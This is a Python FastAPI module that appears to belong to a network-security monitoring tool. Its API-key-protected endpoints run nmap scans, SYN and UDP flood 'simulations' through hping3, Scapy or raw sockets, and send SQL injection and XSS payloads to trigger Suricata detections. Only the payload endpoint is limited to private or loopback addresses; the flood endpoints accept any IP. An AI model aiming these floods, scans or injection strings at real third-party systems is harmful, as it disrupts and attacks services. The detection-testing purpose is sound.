import asyncio
import ipaddress
import subprocess
import atexit
import structlog
from fastapi import APIRouter, HTTPException, Depends
from typing import Dict, Any, Optional
from pathlib import Path

from relay.middleware.auth import require_api_key

logger = structlog.get_logger("simulation")
router = APIRouter(prefix="/api/simulation", tags=["Simulation"])
_spawned_processes = set()


def _validate_ip(target: str) -> str:
    """Validates that target is a well-formed IP address. Raises HTTP 422 otherwise."""
    try:
        return str(ipaddress.ip_address(target))
    except ValueError:
        raise HTTPException(
            status_code=422,
            detail=f"Invalid target: '{target}' is not a valid IP address. "
                   "Hostnames and shell metacharacters are not permitted."
        )


def _track_process(process: subprocess.Popen):
    _spawned_processes.add(process)
    return process


def _cleanup_spawned_processes():
    for process in list(_spawned_processes):
        try:
            if process.poll() is None:
                process.terminate()
        except Exception:
            pass


atexit.register(_cleanup_spawned_processes)


@router.post("/nmap/scan", dependencies=[Depends(require_api_key)])
async def run_nmap_scan(request: Dict[str, Any]):
    """
    Runs an Nmap scan against a target IP.
    Requires nmap to be installed on the host.
    Requires X-Sentinel-Key header if SENTINEL_API_KEY is configured.
    """
    target = _validate_ip(request.get("target", ""))
    profile = request.get("profile", "quick")

    logger.info("Nmap scan requested", target=target, profile=profile)

    # Strict allowlist for profiles — prevents injection via profile parameter
    profiles = {
        "quick":      ["-F", "--open"],
        "ping":       ["-sn"],
        "service":    ["-sV", "--version-intensity", "0"],
        "os_detect":  ["-O", "--osscan-limit"],
        "aggressive": ["-A", "-T4"],
        "vuln":       ["--script", "vuln"],
    }

    if profile not in profiles:
        raise HTTPException(
            status_code=400,
            detail=f"Unknown profile '{profile}'. Valid options: {list(profiles)}"
        )

    flags = profiles[profile]
    # NOTE: No sudo — nmap runs as the current user.
    # OS detection and some scripts require root; they will return a partial result.
    command = ["nmap"] + flags + [target]

    try:
        process = await asyncio.create_subprocess_exec(
            *command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
        except asyncio.TimeoutError:
            process.kill()
            await process.communicate()
            return {"success": False, "error": "Nmap scan timed out after 60 seconds"}

        if process.returncode == 0:
            return {
                "success": True,
                "raw_output": stdout.decode(),
                "target": target,
                "profile": profile,
            }
        else:
            return {
                "success": False,
                "error": stderr.decode() or "Nmap execution failed",
                "raw_output": stdout.decode(),
            }
    except FileNotFoundError:
        return {"success": False, "error": "nmap is not installed on this system."}
    except Exception as e:
        logger.error("Nmap subprocess failed", error=str(e))
        return {"success": False, "error": str(e)}


@router.post("/attack/ddos/syn", dependencies=[Depends(require_api_key)])
async def simulate_ddos_syn(request: Dict[str, Any]):
    """
    Simulates a SYN-flood DDoS attack using hping3 (if available)
    or a Scapy fallback script.
    Target must be a valid IP address.
    """
    target = _validate_ip(request.get("target", ""))
    logger.warning("SYN-Flood DDoS Simulation started", target=target)

    try:
        hping_check = subprocess.run(["which", "hping3"], capture_output=True, timeout=5)
        if hping_check.returncode == 0:
            # NOTE: hping3 SYN flood — no sudo, no --rand-source (requires root)
            cmd = ["hping3", "-S", "-p", "80", "-c", "5000", target]
            _track_process(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            return {"success": True, "message": f"SYN Flood simulation started against {target} (5000 packets via hping3)"}
        else:
            # Fallback: Scapy-based SYN flood
            project_root = Path(__file__).resolve().parents[3]
            script_path = project_root / "scripts" / "sim_flood.py"

            if not script_path.exists():
                script_path.parent.mkdir(parents=True, exist_ok=True)
                script_content = (
                    "import sys\n"
                    "from scapy.all import IP, TCP, send\n"
                    "target = sys.argv[1]\n"
                    "print(f'Flooding {target}...')\n"
                    "pkt = IP(dst=target)/TCP(dport=80, flags='S')\n"
                    "send(pkt, loop=1, count=1000, verbose=0)\n"
                )
                with open(script_path, "w") as f:
                    f.write(script_content)

            import sys
            _track_process(subprocess.Popen(
                [sys.executable, str(script_path), target],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            ))
            return {"success": True, "message": f"SYN Flood simulation (Scapy) started against {target}"}

    except Exception as e:
        logger.error("SYN DDoS simulation failed", error=str(e))
        return {"success": False, "error": str(e)}


@router.post("/attack/ddos/udp", dependencies=[Depends(require_api_key)])
async def simulate_ddos_udp(request: Dict[str, Any]):
    """
    Simulates a UDP-flood DDoS attack using raw sockets (no external tools needed).
    Sends 2500 UDP packets across random ports to trigger Suricata threshold rules.
    Target must be a valid IP address.
    """
    target = _validate_ip(request.get("target", ""))
    logger.warning("UDP-Flood DDoS Simulation started", target=target)

    def _send_packets():
        import socket
        import random
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_payload = random._urandom(1024)
        for _ in range(5):
            for _ in range(500):
                port = random.randint(1, 65535)
                try:
                    sock.sendto(bytes_payload, (target, port))
                except Exception as e:
                    logger.debug("Failed to send UDP packet in simulation", error=str(e))
            import time
            time.sleep(0.1)
        sock.close()

    try:
        await asyncio.to_thread(_send_packets)
        return {"success": True, "message": f"UDP Flood simulation (2500 packets) sent to {target}"}
    except Exception as e:
        logger.error("UDP DDoS simulation failed", error=str(e))
        return {"success": False, "error": str(e)}


@router.post("/attack/payload", dependencies=[Depends(require_api_key)])
async def run_payload_simulation(request: Dict[str, Any]):
    """
    Sends malicious HTTP payloads (SQLi, XSS) to the local Sentinel API
    to trigger signature-based Suricata detections.
    Target must be a valid IP address (typically 127.0.0.1).
    """
    target = _validate_ip(request.get("target", "127.0.0.1"))

    # SSRF guard — payload simulation only makes sense targeting the local machine
    addr = ipaddress.ip_address(target)
    if not addr.is_loopback and not addr.is_private:
        raise HTTPException(
            status_code=422,
            detail="Payload simulation is only permitted against loopback or private network addresses."
        )

    logger.info("Simulating Payload Injection", target=target)

    payloads = [
        "' OR '1'='1' --",
        "admin' --",
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
    ]

    def _send_payloads():
        import requests
        from common.config import API_PORT
        for p in payloads:
            try:
                requests.get(f"http://{target}:{API_PORT}/api/health?id={p}", timeout=1.0)
            except Exception as e:
                logger.debug("Failed to send HTTP payload in simulation", error=str(e))

    try:
        await asyncio.to_thread(_send_payloads)
        return {"success": True, "message": f"Malicious payloads ({len(payloads)}) injected towards {target}"}
    except Exception as e:
        logger.error("Payload simulation failed", error=str(e))
        return {"success": False, "error": str(e)}
